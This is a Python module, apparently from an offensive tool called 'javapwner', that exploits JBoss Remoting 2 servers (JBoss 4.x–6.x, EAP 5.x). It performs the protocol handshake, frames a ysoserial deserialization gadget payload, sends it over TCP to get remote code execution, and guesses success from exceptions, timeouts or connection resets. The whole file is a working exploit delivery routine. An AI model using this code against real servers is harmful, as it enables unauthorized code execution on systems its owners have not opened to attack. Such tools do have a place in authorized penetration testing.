"""JBoss Remoting 2 exploitation — binary protocol deserialization attack.

JBoss Remoting 2 (used in JBoss 4.x–6.x and EAP 5.x) transmits serialised
Java objects over a binary TCP protocol.  If the endpoint accepts arbitrary
class deserialization, a ysoserial payload can achieve RCE.

The protocol starts with a GREETING from the server, followed by a client
request that embeds a serialised ``InvocationRequest``.  We replace the
request body with a ysoserial gadget chain payload.
"""

from __future__ import annotations

import socket
import struct
from dataclasses import dataclass, field
from typing import Any

from javapwner.core.serialization import detect_exception_in_stream

# JBoss Remoting 2 GREETING magic: 0x77 0x01 0x16 0x79
_REMOTING2_MAGIC = b"\x77\x01\x16\x79"

# Remoting 2 invocation header constants
_REMOTING2_VERSION = b"\x00\x16"       # Version 2.2
_REQUEST_HEADER = b"\x00\x00\x00\x00"  # request id = 0


@dataclass
class Remoting2ExploitResult:
    """Result of a JBoss Remoting 2 exploit attempt."""
    sent: bool = False
    likely_success: bool = False
    greeting_received: bool = False
    response_bytes: bytes = field(default=b"", repr=False)
    error: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "sent": self.sent,
            "likely_success": self.likely_success,
            "greeting_received": self.greeting_received,
            "error": self.error,
        }


class JBossRemoting2Exploiter:
    """Send a ysoserial payload via the JBoss Remoting 2 binary protocol.

    Parameters
    ----------
    timeout:
        Network timeout in seconds.
    """

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def exploit(
        self, host: str, port: int, payload_bytes: bytes
    ) -> Remoting2ExploitResult:
        """Connect to the Remoting 2 endpoint and deliver the payload.

        Parameters
        ----------
        host, port:
            Target JBoss Remoting 2 endpoint (typically 4446 or the EAP
            remoting port).
        payload_bytes:
            Raw serialised Java payload (ysoserial output).
        """
        result = Remoting2ExploitResult()

        try:
            with socket.create_connection((host, port), timeout=self.timeout) as sock:
                sock.settimeout(self.timeout)

                # Step 1: Read server GREETING
                greeting = sock.recv(64)
                if not greeting or greeting[:4] != _REMOTING2_MAGIC:
                    result.error = "Not a JBoss Remoting 2 endpoint"
                    return result
                result.greeting_received = True

                # Step 2: Send client-side handshake / version
                # Minimal handshake: just send the version + marshalling type
                client_hello = (
                    _REMOTING2_MAGIC
                    + _REMOTING2_VERSION
                    + b"\x00"  # marshalling type: 0 = Java serialisation
                )
                sock.sendall(client_hello)

                # Step 3: Send invocation with the payload
                # The invocation frame: length (4 bytes) + request header + payload
                frame_body = _REQUEST_HEADER + payload_bytes
                frame = struct.pack(">I", len(frame_body)) + frame_body
                sock.sendall(frame)
                result.sent = True

                # Step 4: Check response
                try:
                    response = sock.recv(4096)
                    result.response_bytes = response
                    if detect_exception_in_stream(response):
                        result.likely_success = False
                    else:
                        result.likely_success = True
                except socket.timeout:
                    # No response = blind execution
                    result.likely_success = True

        except OSError as exc:
            if result.sent:
                result.likely_success = True  # connection reset after send
            else:
                result.error = str(exc)

        return result
